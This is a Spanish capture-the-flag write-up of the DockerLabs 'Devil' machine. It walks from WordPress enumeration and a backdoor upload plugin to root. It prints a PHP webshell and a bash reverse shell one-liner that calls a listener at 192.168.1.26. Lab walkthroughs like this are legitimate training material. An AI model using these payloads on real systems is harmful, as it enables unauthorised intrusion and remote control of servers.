# Devil — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** kaikoperez  
**Fecha de creación:** 18/09/2024  
**Técnicas:** WordPress Enumeration · Gobuster · File Upload · PHP WebShell · Reverse Shell · SUID abuse · Binary Analysis

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración WordPress](#2-enumeración-wordpress)
3. [Descubrimiento de la backdoor](#3-descubrimiento-de-la-backdoor)
4. [File Upload — WebShell PHP](#4-file-upload--webshell-php)
5. [Reverse Shell](#5-reverse-shell)
6. [Escalada horizontal — usuario lucas](#6-escalada-horizontal--usuario-lucas)
7. [Escalada final a root](#7-escalada-final-a-root)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh devil.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
```

Servicios detectados:

```text
Apache httpd 2.4.58
Drupal 10
```

El sitio web muestra:

```text
Hackstry
```

---

## 2. Enumeración WordPress

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/wp-content
/wp-includes
/index.php
/license.txt
```

Identificamos un dominio asociado:

```text
devil.lab
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 devil.lab
```

Realizamos nuevamente enumeración:

```bash
gobuster dir -u http://devil.lab \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/wp-content
/wp-login.php
/wp-admin
/functions.php
/wp-crackback.php
```

---

## 3. Descubrimiento de la backdoor

Enumeramos directorios dentro de `wp-content`:

```bash
gobuster dir -u http://devil.lab/wp-content \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/plugins
/uploads
/themes
```

Enumeramos plugins:

```bash
gobuster dir -u http://devil.lab/wp-content/plugins \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/backdoor
/hello.php
```

Exploramos la ruta:

```text
http://devil.lab/wp-content/plugins/backdoor
```

Encontramos una funcionalidad de subida de archivos.

---

## 4. File Upload — WebShell PHP

Creamos una WebShell PHP:

```php
<?php

system($_GET["cmd"]);

?>
```

Guardamos el archivo como:

```text
shell.php
```

Subimos el fichero mediante la aplicación web.

Comprobamos ejecución de comandos:

```text
http://devil.lab/wp-content/plugins/backdoor/uploads/shell.php?cmd=id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La aplicación es vulnerable a ejecución remota de comandos.

---

## 5. Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 444
```

Generamos una reverse shell Bash desde la WebShell:

```text
bash -c 'bash -i >& /dev/tcp/192.168.1.26/444 0>&1'
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

Exploramos el sistema y encontramos el directorio:

```bash
/home/andy/.secret
```

Archivos relevantes:

```text
escalate.c
ftpserver
```

Leemos el código fuente:

```bash
cat escalate.c
```

El programa cambia el UID efectivo al usuario `lucas` y ejecuta una shell.

---

## 6. Escalada horizontal — usuario lucas

Ejecutamos el binario:

```bash
./ftpserver
```

Resultado:

```text
UID actual: 1001
EUID actual: 1001
```

Verificamos usuario:

```bash
whoami
lucas
```

---

## 7. Escalada final a root

Explorando el directorio personal de `lucas` encontramos:

```bash
/home/lucas/.game
```

Archivos encontrados:

```text
EligeOMuere
game.c
```

Leemos el código fuente:

```bash
cat game.c
```

Observamos:

```c
int secret_number = 7;
```

El programa ejecuta `/bin/bash` como root si acertamos el número correcto.

Ejecutamos el binario:

```bash
./EligeOMuere
```

Introducimos:

```text
7
```

Resultado:

```text
¡Felicidades! Has adivinado el número.
Iniciando shell como root...
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Enumeración WordPress | Descubrimiento de rutas sensibles |
| Backdoor con File Upload | Ejecución remota de código |
| WebShell PHP | Acceso inicial |
| Binario vulnerable con cambio de UID | Escalada horizontal |
| Binario SUID mal diseñado | Escalada final a root |

**Para defenderse:**

- Eliminar plugins y backdoors inseguros.
- Restringir subida de archivos ejecutables.
- Auditar binarios personalizados.
- Aplicar principio de mínimo privilegio.
- Monitorizar rutas sensibles en WordPress.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
